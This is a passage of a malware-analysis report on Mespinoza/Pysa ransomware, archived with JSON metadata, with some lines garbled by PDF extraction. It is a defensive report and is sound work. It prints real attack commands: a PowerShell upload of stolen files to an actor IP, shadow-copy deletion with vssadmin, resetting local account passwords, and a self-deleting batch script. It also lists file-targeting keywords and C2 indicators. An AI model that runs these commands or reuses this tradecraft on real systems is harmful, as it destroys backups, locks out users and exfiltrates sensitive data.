actor refers to the impacted organization as their “partner,” as seen in the following\nexample description:\n\nOur partners provide you with their transaction history, invoices and bank documents for viewing.\n\nDuring our analysis, the actors collected potentially sensitive files by running a PowerShell script that would enumerate files on the system,\nignoring files with specific file extensions and files in specific folders and sending files whose filename contained one of 71 sub-strings. When a\nfile of interest was found, the PowerShell script uses the System.Net.WebClient.UploadFile method to upload the file to a URL with the\nfollowing structure:\n\n193.34.166[.]92/upload-wekkmferokmsdderiuheoirhuiewiwnijnfrer?token=<base64 token value>&id=<unique number for\norganization>&fullPath=<path on disk of file exfiltrated>\n\nThe PowerShell script identifies files of interest by comparing the filename to the 71 sub-strings seen in Table 6. The sub-strings would suggest\nthe actors are interested in gathering a variety of different types of information, including documents related to finances, account credentials,\ngovernment, employees and other personal identifiable information (PII). Several of the sub-strings, such as illegal, fraud and criminal, suggest\nthat the actors are also interested in illegal activities known to the organization as well.\n\nsecret checking illegal bureau billing sec\n\nprivate saving compromate government payment soc\n\nconfident routing privacy securit budget vendor\n\nimportant finance login unclassified criminal tax\n\nfederal agreement credent seed bank emplo\n\ngovernment SWIFT private personal cash hir\n\nsecurity compilation contract partner payroll ssn\n\nfraud report concealed confident password tax\n\nsecret confident clandestine mail driver*license i-9\n\nbalance hidden investigation letter license*driver w-9\n\nstatement clandestine federal passport scans w-4\n\n\n-----\n\npay Staf SSA Emplo Confid\n\n_Table 6 Substrings used to identify files of interest to exfiltrate_\n\nWhen generating a list of files to exfiltrate, the PowerShell script will disregard files based on their file extension if they match the list in Table 7.\nOne could speculate which file types the threat actors were most interested in, as the list of excluded file extensions does not include common\nextensions associated with productivity software, such as “.docx,” “.doc” and “.pdf.” We believe the threat actors are most interested in\ndocument files as they are more likely to contain the sensitive information the actors seek when compared to file types in the exclusion list.\nThere are also errors in the extension exclusion list, specifically the “. rpt” entry that contains the space character that is not allowed in a file\nextension.\n\n.png .evtx .gif .man .pls .trn .ascx .suo .jss\n\n.jpg .rb .log .template .checksum .ipa .application .vsix .jsm\n\n.txt .htm* .url .xsd .cdf-ms .procedure .cls .wsdl .ico\n\n.py .jar .lnk .aspx .cmd .vb .deploy .tt .function\n\n.pyc .dat .cs .h . rpt .cshtml .DIC .cch .hlp\n\n.dll .ini .json .cab .php .config .rll .chw .ldf\n\n.exe .xrm-ms .bak .Pid .svc .chm .so .epub .map\n\n.js .xml .md .frm .java .msp .table .form .mof\n\n.css .swf .manifest .msi .class .msm .tmp .function .mp3\n\n.msg .nupkg\n\n_Table 7. File extensions ignored in identifying files of interest._\n\nLastly, the PowerShell script ignores files stored in the folders and sub-folders that match the sub-strings listed in Table 8. These folders are\nomitted from consideration as they are related to the Windows operating system, application files, browsers and antivirus products, which\nwould unlikely contain any sensitive files of interest to the actors.\n\nWindows Package Cache PerfLogs\n\nSymantec VMware Recovery\n\nChrome Microsoft Boot\n\nMozilla Sophos Program Files\n\nESET System Volume Information ProgramData\n\n_Table 8. Folders ignored in identifying files of interest._\n\n## Deployment\n\nTo deploy Mespinoza, the actor used three batch scripts that would use PsExec to copy files to, and to run commands on, other systems on\nthe network. The actors use one system as a distribution point and run the three batch scripts from this system to spread to other systems on\nthe network. The three scripts carry out the following tasks:\n\n1. Use PsExec to run a PowerShell script located on a shared folder on the distribution server.\n2. Use PsExec to run the copy command to copy the Mespinoza ransomware from the shared folder on the distribution server to\n\nC:\\Windows\\Temp\\svchost.exe to other systems on the network.\n3. Use PsExec to run the copied ransomware sample by running cmd /c c:\\windows\\temp\\svchost.exe\n\nThe initial PowerShell script is meant to precede the ransomware deployment, specifically to disable antivirus, enable remote desktop and to\nmodify the system to maximize the impact of the ransomware. First, the pre-deployment PowerShell script attempts to specifically disable or\nremove both MalwareBytes and Windows Defender antivirus software from the system. The script then attempts to stop services that have\nspecific sub-strings in their display name, as seen in Table 9. These service names suggest the actors wish to run their ransomware after\ndatabase, email and backup services are disabled with the hope that the ransomware would encrypt the files used by these services.\n\nSQL Exchange Sharepoint\n\nOracle Veeam Quest\n\nCitrix Malwarebytes Backup\n\n\n-----\n\n_ab e 9_ _ocesses_ _ed by_ _esp o a p e dep oy_ _e t sc pt_\n\nThe script also uses Windows Management Instrumentation command (wmic) to find and kill processes whose process name has sub-strings\nseen in Table 10. The process names that the script attempts to kill include popular browsers, endpoint protection, productivity, database and\nserver processes.\n\nAgent Backup apache office manage\n\nMalware QuickBooks web anydesk acronis\n\nEndpoint QBDB vnc protect endpoint\n\nCitrix QBData teamviewer secure autodesk\n\nsql QBCF OCS Inventory segurda database\n\nSQL server monitor center adobe\n\nVeeam citrix security agent java\n\nCore.Service sage def silverlight logmein\n\nMongo http dev exchange microsoft\n\nsolarwinds engine AlwaysOn Framework sprout\n\nfirefox chrome barracuda veeam arcserve\n\n_Table 10. Processes killed by Mespinoza pre-deployment script._\n\nThe PowerShell script also attempts to delete the system's restore point and volume shadow copies via the following commands:\n\nGet-ComputerRestorePoint | Delete-ComputerRestorePoint\n\nvssadmin delete shadows /all /quiet\n\nThe script also attempts to further impact the ability to use systems by changing the password of the local user accounts on the system. To\ncarry this out, the PowerShell script obtains a list of local user accounts on the current system by running the following command:\n\nGet-WmiObject -Class Win32_UserAccount -ComputerName $env:COMPUTERNAME -Filter LocalAccount='true' | select -ExpandProperty\nname\n\nIt then iterates through all of the local user accounts and appends the string pysa to the username, generates the MD5 hash of the resulting\nstring and sets the user’s password to the first 13 characters of the MD5 hash by running the following command:\n\n([adsi]\"WinNT://$env:COMPUTERNAME/$user\").SetPassword(\"$pass\");\n\nTo determine if the pre-deployment script successfully ran on the end system, the actor added a command that will create a file in a shared\nfolder on the distribution system with the name of the system the pre-deployment script ran on. The command would write “I'll be back.” to this\nfile, which suggests that the actor expects to revisit the system to deploy the ransomware. The PowerShell command that performs this\nfunctionality appears as follows, of which “[redacted]” replaces the IP address of the distribution system:\n\nNew-Item -Path \"\\\\[redacted]\\log$\" -Name \"$name.txt\" -ItemType \"file\" -Value \"I'll be back.\";\n\n## Ransomware\n\nMespinoza ransomware starts by creating a mutex Pysa, of which Pysa is another alias for this ransomware family. It then enumerates the file\nsystem and writes the following ransom message to a file named Readme.README in each folder:\n\n\n-----\n\nFigure 10. Mespinoza ransomware note.\n_Figure 10. Mespinoza ransomware note._\n\nThe ransomware will omit writing the ransom message and will not encrypt files in folders that have the following within their path:\n\n:\\Windows\\\n\n\\Boot\\\n\n\\BOOTSECT\n\n\\pagefile\n\n\\System Volume Information\\\n\nbootmgr\n\n\\Recovery\n\n\\Microsoft\n\nThe ransomware also writes values to the registry to display the ransom message at system startup. The ransomware edits two registry keys\nin SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System, specifically setting the legalnoticecaption value to PYSA and\nlegalnoticetext to the same ransom message above.\n\nThe ransomware will encrypt files using a RSA public key and the AES-CBC cipher, after which it will rename the encrypted file to change its\nfile extension to .pysa. Before encrypting each file, the ransomware checks the file's extension against the following exclusion list:\n\n.README .docx .myd .backupdb .vfd .vbm\n\n.pysa .xlsx .ndf .bck .avhdx .vrb\n\n.exe .pdf .sdf .bkf .vmcx .win\n\n.dll .db .trc .bkup .vmrs .pst\n\n.sys .db3 .wrk .bup .pbf .mdb\n\n.search-ms .frm .001 .fbk .qic .7z\n\n.sql .ib .acr .mig .sqb .zip\n\n.doc .mdf .bac .spf .tis .rar\n\n.xls .mwb .bak .vhdx .vbk .cad\n\n.dsd .dwg .pla .pln\n\n_Table 11. Encryption exclusion list using file extensions._\n\n\n-----\n\ne a so a e s es by c eat g a batc sc pt at % %\\update bat t t e o o g co te ts, t at t u to de ete t e\nransomware and batch script from the system:\n\n:Repeat\n\ndel \"<ransomware filename>.exe\"\n\nif exist \"<ransomware filename>.exe\" goto Repeat\n\nrmdir \"<folder containing ransomware>\"\n\ndel %TEMP%\\update.bat\n\n## Related Tools\n\nIt appears that actors have been using a combination of the pre-deployment PowerShell script prior to deploying Mespinoza ransomware since\nat least March 2021. We found another pre-deployment script ‘p.ps1’ (SHA256:\n7193d6f3c621596e845694c1348e90ea5a9d99d756c9e9fe5063860cd1ee3838) used prior to a Mespinoza/Pysa ransomware (SHA256:\n90cf35560032c380ddaaa05d9ed6baacbc7526a94a992a07fd02f92f371a8e92) that used the following email addresses within the ransom\nmessage:\n\nluebegg8024@onionmail[.]org\n\nmayakinggw3732@onionmail[.]org\n\nlauriabornhat7722@protonmail[.]com\n\nWe found that the IP address 89.44.9[.]229 hosted a Gasket and MagicSocks sample the first week of September 2020. At the same time, this\nserver also hosted two PowerShell scripts that gave us additional insight into the threat actors using these tools. The actors would likely use\nboth of the scripts during their post-exploitation activities, specifically related to credential harvesting and to support lateral movement.\n\n[One of the scripts had a filename of keke.ps1, which is a modified version of Invoke-Kerberoast with the comments and all of the lines that](https://gist.githubusercontent.com/jaredhaight/cdebfa81e52352f5de1190a3d86cecea/raw/ccdf8e75de272f60027f113fa0df7bbfbc8ecc32/Invoke-Kerberoast.ps1)\nprint messages to the screen removed (Write-Verbose). The actor renamed the Invoke-Kerberoast function to mommm, which is run and will\noutput its results to a file at the path C:\\Users\\Public\\logs. The actors removed the ability for the script to output the gathered hashes as “John\nthe Ripper” format, which suggests the threat actors removed this code in favor of using the hashcat output format. Therefore, we believe this\n[threat group would exfiltrate the C:\\Users\\Public\\logs file and would use the hashcat tool to try to extract credentials.](https://github.com/hashcat/hashcat)\n\nThe second PowerShell script had a filename of try.ps1, which attempts to split a file at the hardcoded path of C:\\Users\\Public\\lsass.zip into\n5MB blocks. The script would write each of these blocks files with .[number].part appended to the filename. This script suggests that this group\nmay dump the Local Security Authority Subsystem Service (LSASS) process’ memory and wishes to exfiltrate smaller files for credential\nharvesting on a remote system.\n\n## Conclusion\n\nIn a recent incident, threat actors deployed the Mespinoza (also known as Pysa) ransomware by accessing a system via remote desktop and\nrunning a series of batch scripts that use the PsExec tool to copy and execute the ransomware on other systems on the network. Before\ndeploying the ransomware to other systems, the actor runs PowerShell scripts on the other systems on the network to exfiltrate files of interest\nand to maximize the impact of the ransomware.\n\nMespinoza attacks, such as those documented in this report, highlight multiple trends currently occurring amongst multiple ransomware threat\nactors and families that clearly enable their attacks, and make them easy and simple to use in their attacks. As with other ransomware attacks,\nMespinoza originates through the proverbial front door -- internet-facing RDP servers -- mitigating the need to craft phishing emails, perform\nsocial engineering, leverage software vulnerabilities or other more time-consuming and costly activities. Further costs are saved through the\n[use of numerous open-source tools available online for free, or through the use of built-in tools enabling actors to live off the land, all of which](https://www.paloaltonetworks.com/cyberpedia/what-are-fileless-malware-attacks)\nbenefits bottom line expenses and profits.\n\n[Finding RDP servers on the internet can be easily automated. The 2021 Cortex Xpanse Attack Surface Threat Report found RDP was the](https://start.paloaltonetworks.com/asm-report)\nmost common security issue found among global enterprises, representing 32% of overall security issues.\n\nPalo Alto Networks Next-Generation Firewall customers are protected from Mespinoza, Gasket and MagicSocks via the following protections:\n\nAll known Gasket HTTP C2 traffic are detected in Threat Prevention.\nAll known Mespinoza, Gasket and MagicSocks samples receive malicious verdicts in WildFire.\nAll known Gasket and MagicSocks C2 domains have malicious verdicts in Advanced URL Filtering and are classified as Command &\nControl in PAN-DB.\nAll known domains for Gasket and MagicSocks C2 are detected in DNS Security.\n\n**Cortex XDR customers are protected through WildFire verdicts for all known Mespinoza, Gasket and MagicSocks samples and by Local**\nAnalysis for Gasket samples\n\n\n-----\n\n**uto ocus custo** e s ca t ac t e a so a e a d assoc ated too s used t s attac a t e [esp o a a d Gas et tags](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Mespinoza)\n\n**Cortex Xpanse customers can assess and manage their network security attack surface and generate an inventory of their systems.**\n\n## Indicators of Compromise\n\n Gasket SHA256\n\n356671767c368e455f2261f7f76d9ee9bd0b522172490845b89281224ab5dbad\n\n5d8459c2170c296288e2c0dd9a77f5d973b22213af8fa0d276a8794ffe8dc159\n\n64b9b5874820ca26344c919b518d6c0599a991aaf1943a519da98d294bebf01f\n\na30e605fa404e3fcbfc50cb94482618add30f8d4dbd9b38ed595764760eb2e80\n\nb0629dcb1b95b7d7d65e1dad7549057c11b06600c319db494548c88ec690551e\n\nccfa2c14159a535ff1e5a42c5dcfb2a759a1f4b6a410028fd8b4640b4f7983c1\n\n0bcbc1faec0c44d157d5c8170be4764f290d34078516da5dcd8b5039ef54f5ca\n\n85c8ccf45cdb84e99cce74c376ce73fdf08fdd6d0a7809702e317c18a016b388\n\n8b5cdbd315da292bbbeb9ff4e933c98f0e3de37b5b813e87a6b9796e10fbe9e8\n\n701791cd5ed3e3b137dd121a0458977099bb194a4580f364802914483c72b3ce\n\naa2faf0f41cc1710caf736f9c966bf82528a97631e94c7a5d23eadcbe0a2b586\n\nd591f43fc34163c9adbcc98f51bb2771223cc78081e98839ca419e6efd711820\n\nef31b968c71b0e21d9b0674e3200f5a6eb1ebf6700756d4515da7800c2ee6a0f\n\nf8a5065eb53b1e3ac81748176f43dce1f9e06ea8db1ecfa38c146e8ea89fcc0b\n\n12b927235ab1a5eb87222ef34e88d4aababe23804ae12dc0807ca6b256c7281c\n\n045510eb6c86fc2d966aded8722f4c0e73690b5078771944ec1a842e50af4410\n\n6eb0455b0ab3073c88fcba0cad92f73cc53459f94008e57100dc741c23cf41a3\n\n2697bbe0e96c801ff615a97c2258ac27eec015077df5222d52f3fbbcdca901f5\n\nf5cb94aa3e1a4a8b6d107d12081e0770e95f08a96f0fc4d5214e8226d71e7eb7\n\n3a6ddc4022f6abe7bdb95a3ba491aaf7f9713bcb6db1fbaa299f7c68ab04d4f4\n\n7b5027bd231d8c62f70141fa4f50098d056009b46fa2fac16183d1321be04768\n\ne47a632bfd08e72d15517170b06c2de140f5f237b2f370e12fbb3ad4ff75f649\n\n8a9205709c6a1e5923c66b63addc1f833461df2c7e26d9176993f14de2a39d5b\n\n0fd13ece461511fbc129f6584d45fea920200116f41d6097e4dffeb965b19ef4\n\n6d1fde9a5963a672f5e4b35cc7b8eaa8520d830eb30c67fadf8ab82aeb28b81a\n\n89b9ba56ebe73362ef83e7197f85f6480c1e85384ad0bc2a76505ba97a681010\n\nc9bed25ab291953872c90126ce5283ce1ad5269ff8c1bca74a42468db7417045\n\naf97b35d9e30db252034129b7b3e4e6584d1268d00cde9654024ce460526f61e\n\n1b888acb22a8326bd5f80f840390182d00e0c8db416d29d042358b48d1220438\n9986b6881fc1df8f119a6ed693a7858c606aed291b0b2f2b3d9ed866337bdbde\n\nea3b35384e803bef3c02a8f27aea2c2a40f9a4d2726113e1c5f2bc3be9c41322\n\nd9c753b859414e4b38a0841423b159590c47ad580249b0cd3c99a0ecc6644914\n\n30bd30642bf83abd74b8b2312ea606e0f192b0d61351f1445d1a1458414992d3\n\n\n-----\n\n0 b a d 35e9c5c 58e8acaee3 c9 e6 ad6 5 e5ca 0 d e9e\n\nc2ef84710937b622f35b2b8fab9f9aa86b718ba7bc77a40b33b92e40747676b5\n\n## Gasket C2\n\n160.20.147[.]184\n\n172.96.189[.]167\n\n172.96.189[.]22\n\n172.96.189[.]246\n\n185.183.96[.]147\n\n185.185.27[.]3\n\n185.186.245[.]85\n\n193.239.84[.]205\n\n193.239.85[.]55\n\n194.187.249[.]102\n\n194.187.249[.]138\n\n194.5.249[.]137\n\n194.5.249[.]138\n\n194.5.249[.]139\n\n194.5.249[.]18\n\n194.5.249[.]180\n\n194.5.250[.]151\n\n194.5.250[.]162\n\n194.5.250[.]216\n\n198.252.100[.]37\n\n23.83.133[.]136\n\n37.120.140[.]184\n\n37.120.140[.]247\n\n37.120.145[.]208\n\n37.221.113[.]66\n\n45.89.175[.]239\n\n45.147.228[.]49\n\n45.147.229[.]29\n\n45.147.230[.]162\n\n45.147.230[.]212\n\n86.106.20[.]144\n\n89.38.225[.]208\n\n89.41.26[.]173\n\naccounting-consult[.]xyz\n\n\n-----\n\nb t [ ]best\n\ncvar99[.]xyz\n\ndowax[.]xyz\n\nenglish-breakfast[.]xyz\n\nenglishdialoge[.]xyz\n\nenglishdict[.]xyz\n\nfirefox-search[.]xyz\n\nntservicepack[.]com\n\nproductoccup[.]tech\n\npump-online[.]xyz\n\nreportservicefuture[.]website\n\nsbvjhs[.]club\n\nsbvjhs[.]xyz\n\nserchtext[.]xyz\n\nspm[.]best\n\nstarhouse[.]xyz\n\nstatistics-update[.]xyz\n\ntransnet[.]wiki\n\nvisual-translator[.]xyz\n\nwiki-text[.]xyz\n\nccenter[.]tech\n\ndowax[.]xyz\n\nenglish-breakfast[.]xyz\n\n## MagicSocks SHA256\n\n2f190f0a3a0f34113affc9edd02b9cacd0eb32cadb1d30a772aa0108e607dd5e\n\nd0b9124bc424982f52ac2af2ebbfbd343f224549543fcf77645c00e4c2c394a0\n\n04c44183426102b395679b009dfa194b648ce541dfb7a04f8e6f76571d8ac5d9\n\n0962cff47f985d5d8202b3cf73752f7e340f87ca82496618c28d37a666376d42\n\nf354b12bc070db12f1e6e9bb60acbb14e067f3469a1d560127256c999e80fd39\n\n0b29bce75c909b67f674b64cc42c5f6b57efae61bbfb071420cc47aa32b4881c\n\n## MagicSocks C2\n\ncreatordampfe[.]xyz\n\n104.168.164[.]195\n\n172.96.189[.]86\n\n142.79.237[.]163\n\n23.227.206[.]158\n\n## Pre Deployment Script\n\n\n-----\n\n897f5a1f4194f5c874547fdcd265de745a1e46da8077c7b68a3ea20f0a404bd0\n\n85761bf03d96111b90954cc8a5d38e250097ec649dd82ebd20946d03dec16714\n\na30f82a95519a55b58c25fa726934dad421ec5dac382be640a9ff016d9da44c7\n\n7193d6f3c621596e845694c1348e90ea5a9d99d756c9e9fe5063860cd1ee3838\n\n0951ca2d4ab7bec16a4145f757a59b0d1acdf3343e862ffa88f2d3f2243362bb\n\n## Related Mespinoza/PYSA SHA256\n\n90cf35560032c380ddaaa05d9ed6baacbc7526a94a992a07fd02f92f371a8e92\n\n44f1def68aef34687bfacf3668e56873f9d603fc6741d5da1209cc55bdc6f1f9\n\n## Related PowerShell Scripts SHA256\n\nf6ccf438c73e4e5ec91c62ffaf6a06aa316fc1ac8efbe903a4d689af47e14877\n\n5c31e73c7796e37a6f604fa0a588a8d3c9289191a7d60c47c8a5ac3f58e24233\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-07-15 - Mespinoza Ransomware Gang Calls Victims “Partners,” Attacks with Gasket, -MagicSocks- Tools.pdf"
    ],
    "report_names": [
        "2021-07-15 - Mespinoza Ransomware Gang Calls Victims “Partners,” Attacks with Gasket, -MagicSocks- Tools.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535750,
    "ts_updated_at": 1743041172,
    "ts_creation_date": 1653698190,
    "ts_modification_date": 1653698190,
    "files": {
        "pdf": "https://archive.orkl.eu/2954a98f5be97efce655050057bcaec59c52e985.pdf",
        "text": "https://archive.orkl.eu/2954a98f5be97efce655050057bcaec59c52e985.txt",
        "img": "https://archive.orkl.eu/2954a98f5be97efce655050057bcaec59c52e985.jpg"
    }
}